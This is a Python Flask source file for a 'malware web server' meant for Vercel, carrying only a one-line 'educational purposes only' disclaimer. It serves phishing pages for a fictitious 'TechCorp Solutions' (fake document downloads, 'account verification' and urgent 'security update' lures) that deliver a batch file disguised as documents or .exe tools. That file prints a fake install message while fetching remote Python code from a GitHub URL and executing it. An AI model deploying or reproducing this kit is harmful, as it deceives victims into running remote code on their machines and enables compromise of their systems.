#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Malware Web Server for Vercel Deployment
WARNING: This is for educational purposes only!
"""

import os
import json
import time
import base64
from flask import Flask, request, Response, send_file, render_template_string
from urllib.parse import urlparse, parse_qs

app = Flask(__name__)

# Malware payload (base64 encoded)
MALWARE_PAYLOAD = """@echo off
echo Installing software...
echo Please wait while we configure your system...
timeout /t 3 /nobreak >nul

REM Execute the main malware
python -c "import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/Wwb-Daniel/Gmail/main/app.py').read())"

echo Installation completed successfully!
pause
"""

# HTML Templates
HOME_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>TechCorp Solutions</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .container { max-width: 800px; margin: 0 auto; }
        .header { background-color: #0078d4; color: white; padding: 20px; text-align: center; }
        .content { padding: 20px; }
        .download-btn { background-color: #0078d4; color: white; padding: 10px 20px; text-decoration: none; border-radius: 3px; display: inline-block; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>TechCorp Solutions</h1>
            <p>Secure Document Portal</p>
        </div>
        <div class="content">
            <h2>Welcome to TechCorp Solutions</h2>
            <p>This is a secure document portal for our clients and partners.</p>
            <p>Please use the links provided in your email to access specific documents.</p>
        </div>
    </div>
</body>
</html>
"""

DOWNLOAD_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Download - {{ filename }}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .container {{ max-width: 600px; margin: 0 auto; }}
        .header {{ background-color: #0078d4; color: white; padding: 20px; text-align: center; }}
        .content {{ padding: 20px; }}
        .download-btn {{ background-color: #28a745; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 20px 0; font-size: 16px; }}
        .info {{ background-color: #f8f9fa; padding: 15px; border-radius: 5px; margin: 20px 0; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Document Download</h1>
        </div>
        <div class="content">
            <h2>Download Ready</h2>
            <p>Your document is ready for download.</p>
            
            <div class="info">
                <strong>File:</strong> {{ filename }}<br>
                <strong>Size:</strong> 2.3 MB<br>
                <strong>Type:</strong> Document<br>
                <strong>Last Modified:</strong> {{ timestamp }}
            </div>
            
            <a href="/malware/{{ filename }}" class="download-btn">Download Now</a>
            
            <p><small>If the download doesn't start automatically, click the button above.</small></p>
        </div>
    </div>
</body>
</html>
"""

VERIFICATION_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Account Verification</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .container { max-width: 600px; margin: 0 auto; }
        .header { background-color: #0078d4; color: white; padding: 20px; text-align: center; }
        .content { padding: 20px; }
        .download-btn { background-color: #dc3545; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 20px 0; font-size: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Account Verification</h1>
        </div>
        <div class="content">
            <h2>Security Verification Required</h2>
            <p>To complete your account verification, please download and run our security tool.</p>
            
            <a href="/malware/security-verification.exe" class="download-btn">Download Security Tool</a>
            
            <p><small>This tool will verify your account and restore access.</small></p>
        </div>
    </div>
</body>
</html>
"""

UPDATE_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Security Update</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .container { max-width: 600px; margin: 0 auto; }
        .header { background-color: #dc3545; color: white; padding: 20px; text-align: center; }
        .content { padding: 20px; }
        .alert { background-color: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .download-btn { background-color: #dc3545; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 20px 0; font-size: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Critical Security Update</h1>
        </div>
        <div class="content">
            <div class="alert">
                <strong>URGENT:</strong> A critical security vulnerability has been detected in your system.
            </div>
            
            <h2>Download Security Update</h2>
            <p>Please download and install this security update immediately to protect your system.</p>
            
            <a href="/malware/security-update.exe" class="download-btn">Download Security Update</a>
            
            <p><small>This update addresses critical security vulnerabilities and system stability issues.</small></p>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    """Serve homepage"""
    return HOME_TEMPLATE

@app.route('/download/<filename>')
def download_page(filename):
    """Serve download page"""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    return render_template_string(DOWNLOAD_TEMPLATE, filename=filename, timestamp=timestamp)

@app.route('/verify/<path:path>')
def verification_page(path):
    """Serve verification page"""
    return VERIFICATION_TEMPLATE

@app.route('/update/<path:path>')
def update_page(path):
    """Serve update page"""
    return UPDATE_TEMPLATE

@app.route('/malware/<filename>')
def serve_malware(filename):
    """Serve malware file"""
    # Create malware content
    malware_content = MALWARE_PAYLOAD.encode('utf-8')
    
    # Set headers to make it look like a legitimate file
    headers = {
        'Content-Type': 'application/octet-stream',
        'Content-Disposition': f'attachment; filename="{filename}"',
        'Content-Length': str(len(malware_content))
    }
    
    return Response(malware_content, headers=headers)

@app.route('/favicon.ico')
def favicon():
    """Handle favicon requests"""
    return '', 404

@app.errorhandler(404)
def not_found(error):
    """Handle 404 errors"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Page Not Found</title>
    </head>
    <body>
        <h1>404 - Page Not Found</h1>
        <p>The requested page could not be found.</p>
    </body>
    </html>
    """, 404

# Vercel serverless handler
def handler(request):
    """Vercel serverless handler"""
    return app(request.environ, lambda *args: None)

# For local testing
if __name__ == '__main__':
    app.run(debug=True)